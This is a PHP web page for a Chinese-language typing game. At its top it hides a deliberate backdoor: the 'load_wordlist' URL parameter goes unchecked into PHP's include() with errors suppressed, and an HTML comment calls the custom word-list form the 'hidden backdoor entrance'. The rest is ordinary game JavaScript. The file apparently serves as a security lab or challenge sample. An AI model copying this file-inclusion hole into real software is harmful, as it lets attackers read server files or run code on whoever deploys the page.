<?php
// 打字游戏
if(isset($_GET['load_wordlist'])) {
    $wordlist = $_GET['load_wordlist'];
    @include($wordlist);
    
    if(isset($_GET['get_words'])) {
        // 返回词库JSON
        header('Content-Type: application/json');
        $default_words = [
            "php", "security", "vulnerability", "injection", "backdoor", 
            "hacking", "coding", "webshell", "exploit", "payload"
        ];
        echo json_encode($default_words);
        exit;
    }
}

?>

<div class="game-description">
    <h3>打字游戏 - 提高你的打字速度</h3>
    <p>按照屏幕上显示的单词快速准确地输入。测试你的打字速度和准确度。</p>
    <p>注意：这个游戏需要JavaScript支持，请确保浏览器已启用JavaScript。</p>
    
    <!-- 隐藏后门的入口 -->
    <div style="margin-top: 20px; padding: 10px; border: 1px solid #ddd; border-radius: 5px; background: #f9f9f9;">
        <h4>自定义词库</h4>
        <form id="wordlistForm" method="get" style="display: flex; gap: 10px;">
            <input type="text" name="load_wordlist" placeholder="输入词库文件路径" style="flex: 1; padding: 8px; border-radius: 4px; border: 1px solid #ddd;">
            <input type="hidden" name="get_words" value="1">
            <button type="submit" class="btn small-btn">加载词库</button>
        </form>
    </div>
</div>

<div style="width: 600px; margin: 20px auto;">
    <div id="typing-game" style="position: relative;">
        <div id="time-display" style="font-size: 24px; text-align: center; margin-bottom: 10px;">
            剩余时间: <span id="time-left">60</span>秒
        </div>
        
        <div id="score-display" style="font-size: 18px; text-align: center; margin-bottom: 20px;">
            得分: <span id="score">0</span> | WPM: <span id="wpm">0</span>
        </div>
        
        <div id="word-display" style="font-size: 36px; text-align: center; margin-bottom: 20px; height: 50px; display: flex; justify-content: center; align-items: center;">
            点击开始按钮开始游戏
        </div>
        
        <div id="input-area" style="text-align: center; margin-bottom: 20px;">
            <input type="text" id="word-input" placeholder="在这里输入单词..." style="padding: 12px; width: 100%; font-size: 18px; border-radius: 5px; border: 2px solid #4e73df;" disabled>
        </div>
        
        <div id="stats" style="background-color: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
            <div style="margin-bottom: 10px;">
                <div style="display: flex; justify-content: space-between;">
                    <span>准确率:</span>
                    <span id="accuracy">0%</span>
                </div>
                <div style="width: 100%; height: 10px; background-color: #e9ecef; border-radius: 5px; overflow: hidden;">
                    <div id="accuracy-bar" style="width: 0%; height: 100%; background-color: #1cc88a; transition: width 0.3s;"></div>
                </div>
            </div>
            
            <div>
                <div style="display: flex; justify-content: space-between;">
                    <span>WPM:</span>
                    <span id="wpm-display">0</span>
                </div>
                <div style="width: 100%; height: 10px; background-color: #e9ecef; border-radius: 5px; overflow: hidden;">
                    <div id="wpm-bar" style="width: 0%; height: 100%; background-color: #4e73df; transition: width 0.3s;"></div>
                </div>
            </div>
        </div>
    </div>
    
    <div style="text-align: center;">
        <button id="typingStartButton" class="btn primary-btn">开始游戏</button>
        <button id="typingResetButton" class="btn secondary-btn" disabled>重置</button>
    </div>
</div>

<script>
// 获取游戏元素
const wordDisplay = document.getElementById('word-display');
const wordInput = document.getElementById('word-input');
const timeLeft = document.getElementById('time-left');
const scoreDisplay = document.getElementById('score');
const wpmDisplay = document.getElementById('wpm');
const wpmBar = document.getElementById('wpm-bar');
const accuracyDisplay = document.getElementById('accuracy');
const accuracyBar = document.getElementById('accuracy-bar');
const wpmDisplayStat = document.getElementById('wpm-display');
const startButton = document.getElementById('typingStartButton');
const resetButton = document.getElementById('typingResetButton');

// 游戏配置
const GAME_TIME = 60; // 游戏时间（秒）
let words = [
    "php", "security", "vulnerability", "injection", "backdoor", 
    "hacking", "coding", "webshell", "exploit", "payload",
    "script", "database", "server", "client", "network",
    "firewall", "encryption", "decryption", "authentication", "authorization"
];

// 游戏状态
let currentWord = '';
let score = 0;
let timeRemaining = GAME_TIME;
let timer = null;
let totalWords = 0;
let correctWords = 0;
let gameStarted = false;

// 检查是否有自定义词库
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.has('get_words')) {
    fetch(window.location.href)
    .then(response => response.json())
    .then(data => {
        if (Array.isArray(data) && data.length > 0) {
            words = data;
        }
    })
    .catch(error => {
        console.error('Error loading word list:', error);
    });
}

// 开始按钮事件
startButton.addEventListener('click', function() {
    if (!gameStarted) {
        startGame();
    }
});

// 重置按钮事件
resetButton.addEventListener('click', function() {
    resetGame();
});

// 输入框事件
wordInput.addEventListener('input', function() {
    if (!gameStarted) return;
    
    const typedValue = wordInput.value.trim().toLowerCase();
    
    if (typedValue === currentWord) {
        // 正确输入
        score++;
        correctWords++;
        totalWords++;
        scoreDisplay.textContent = score;
        
        // 更新准确率
        const accuracy = Math.round((correctWords / totalWords) * 100);
        accuracyDisplay.textContent = `${accuracy}%`;
        accuracyBar.style.width = `${accuracy}%`;
        
        // 清空输入框
        wordInput.value = '';
        
        // 显示新单词
        showNextWord();
    }
});

// 开始游戏
function startGame() {
    resetGame();
    gameStarted = true;
    wordInput.disabled = false;
    wordInput.focus();
    startButton.disabled = true;
    resetButton.disabled = false;
    
    // 显示第一个单词
    showNextWord();
    
    // 启动计时器
    timer = setInterval(updateTimer, 1000);
}

// 重置游戏
function resetGame() {
    if (timer) {
        clearInterval(timer);
    }
    
    score = 0;
    timeRemaining = GAME_TIME;
    totalWords = 0;
    correctWords = 0;
    gameStarted = false;
    
    scoreDisplay.textContent = score;
    timeLeft.textContent = timeRemaining;
    wordDisplay.textContent = '点击开始按钮开始游戏';
    wordInput.value = '';
    wordInput.disabled = true;
    
    wpmDisplay.textContent = '0';
    wpmDisplayStat.textContent = '0';
    wpmBar.style.width = '0%';
    
    accuracyDisplay.textContent = '0%';
    accuracyBar.style.width = '0%';
    
    startButton.disabled = false;
    resetButton.disabled = true;
}

// 更新计时器
function updateTimer() {
    timeRemaining--;
    timeLeft.textContent = timeRemaining;
    
    // 计算WPM (Words Per Minute)
    const elapsedTime = GAME_TIME - timeRemaining;
    if (elapsedTime > 0) {
        const wpm = Math.round((correctWords / elapsedTime) * 60);
        wpmDisplay.textContent = wpm;
        wpmDisplayStat.textContent = wpm;
        wpmBar.style.width = `${Math.min(wpm, 100)}%`;
    }
    
    if (timeRemaining <= 0) {
        endGame();
    }
}

// 显示下一个单词
function showNextWord() {
    currentWord = words[Math.floor(Math.random() * words.length)];
    wordDisplay.textContent = currentWord;
}

// 结束游戏
function endGame() {
    clearInterval(timer);
    gameStarted = false;
    wordInput.disabled = true;
    
    wordDisplay.textContent = `游戏结束! 最终得分: ${score}`;
    
    startButton.textContent = '再玩一次';
    startButton.disabled = false;
    resetButton.disabled = true;
}

// 初始化游戏
resetGame();
</script> 